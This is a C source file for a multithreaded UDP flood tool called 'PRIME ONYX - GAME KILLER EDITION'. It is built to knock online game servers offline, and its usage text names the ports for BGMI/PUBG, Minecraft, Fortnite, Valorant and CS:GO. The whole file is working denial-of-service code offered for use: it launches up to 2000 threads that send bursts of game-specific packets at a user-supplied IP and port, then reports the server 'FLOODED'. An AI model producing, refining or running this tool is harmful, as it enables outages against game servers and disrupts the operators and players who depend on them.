#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netdb.h>

// ============================================
// GAME KILLER CONFIGURATION
// ============================================
#define MAX_THREADS 2000
#define PACKET_SIZE 1024
#define BURST_SIZE 200

volatile int stop_attack = 0;

void handle_signal(int sig) {
    stop_attack = 1;
    printf("\n[!] Attack stopped\n");
}

void banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║              PRIME ONYX - GAME KILLER EDITION                    ║\n");
    printf("║                   BGMI | PUBG | MINECRAFT | FORTNITE             ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
}

void usage() {
    banner();
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║ Usage: ./bgmi <IP> <PORT> <TIME> <THREADS>                        ║\n");
    printf("║ Example: ./bgmi 1.1.1.1 27015 300 1000                           ║\n");
    printf("║                                                                    ║\n");
    printf("║ Game Ports:                                                        ║\n");
    printf("║   BGMI/PUBG: 27015-27030                                          ║\n");
    printf("║   Minecraft: 25565                                                ║\n");
    printf("║   Fortnite: 7777, 7778                                            ║\n");
    printf("║   Valorant: 8080, 8081                                            ║\n");
    printf("║   CS:GO: 27015                                                    ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    unsigned long long packets;
} attack_data;

// Game-Specific Payloads
unsigned char game_payloads[][PACKET_SIZE] = {
    // BGMI/PUBG Payloads (Most Effective)
    {0x16, 0x9e, 0x56, 0xc2, 0xf0, 0x22, 0xe3, 0x66, 0xf4, 0x6a, 0x55, 0xdf, 0x27, 0x01, 0x1c, 0x5a},
    {0x16, 0x9e, 0x56, 0xc2, 0xf4, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0x3a},
    {0x16, 0x9e, 0x56, 0xc2, 0xc8, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0x1a},
    
    // Minecraft Payloads
    {0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0xfe, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    
    // Fortnite Payloads
    {0x46, 0x4f, 0x52, 0x54, 0x4e, 0x49, 0x54, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x46, 0x4f, 0x52, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    
    // Generic Game Query Payload
    {0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00},
};

void* game_attack(void* arg) {
    attack_data* data = (attack_data*)arg;
    int sock;
    struct sockaddr_in target;
    char packet[PACKET_SIZE];
    time_t end_time;
    int idx = 0;
    int payload_count = sizeof(game_payloads) / sizeof(game_payloads[0]);
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    int buffer = 8 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer, sizeof(buffer));
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    target.sin_addr.s_addr = inet_addr(data->ip);
    
    end_time = time(NULL) + data->duration;
    data->packets = 0;
    
    while (time(NULL) < end_time && !stop_attack) {
        for (int b = 0; b < BURST_SIZE && !stop_attack; b++) {
            for (int i = 0; i < payload_count; i++) {
                memcpy(packet, game_payloads[idx % payload_count], 64);
                sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target));
                data->packets++;
                idx++;
            }
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    signal(SIGINT, handle_signal);
    
    if (argc != 5) usage();
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    banner();
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    GAME KILLER ATTACK                             ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Target      : %s:%d\n", ip, port);
    printf("║ Duration    : %d seconds (%d minutes)\n", duration, duration/60);
    printf("║ Threads     : %d\n", threads);
    printf("║ Payloads    : %d game-specific\n", (int)(sizeof(game_payloads)/sizeof(game_payloads[0])));
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("🔥 GAME KILLER Attack Starting...\n");
    printf("🎯 Target Locked: %s:%d\n", ip, port);
    printf("⚡ Launching %d threads with game payloads...\n\n", threads);
    
    pthread_t tids[threads];
    attack_data data[threads];
    
    for (int i = 0; i < threads; i++) {
        strcpy(data[i].ip, ip);
        data[i].port = port;
        data[i].duration = duration;
        data[i].thread_id = i + 1;
        data[i].packets = 0;
        pthread_create(&tids[i], NULL, game_attack, &data[i]);
    }
    
    printf("✅ All %d threads launched!\n", threads);
    printf("⏳ Attack running for %d seconds...\n\n", duration);
    
    for (int elapsed = 30; elapsed <= duration && !stop_attack; elapsed += 30) {
        sleep(30);
        if (!stop_attack) {
            int remaining = duration - elapsed;
            printf("⏳ [%d%%] %d/%d sec | %d min %d sec remaining\n", 
                   (elapsed*100)/duration, elapsed, duration, remaining/60, remaining%60);
        }
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }
    
    unsigned long long total = 0;
    for (int i = 0; i < threads; i++) {
        total += data[i].packets;
    }
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    GAME KILLER ATTACK COMPLETED                   ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Total Packets : %llu\n", total);
    printf("║ Avg Speed     : %llu pps\n", total / duration);
    printf("║ Status        : ✅ Game Server FLOODED\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    return 0;
}
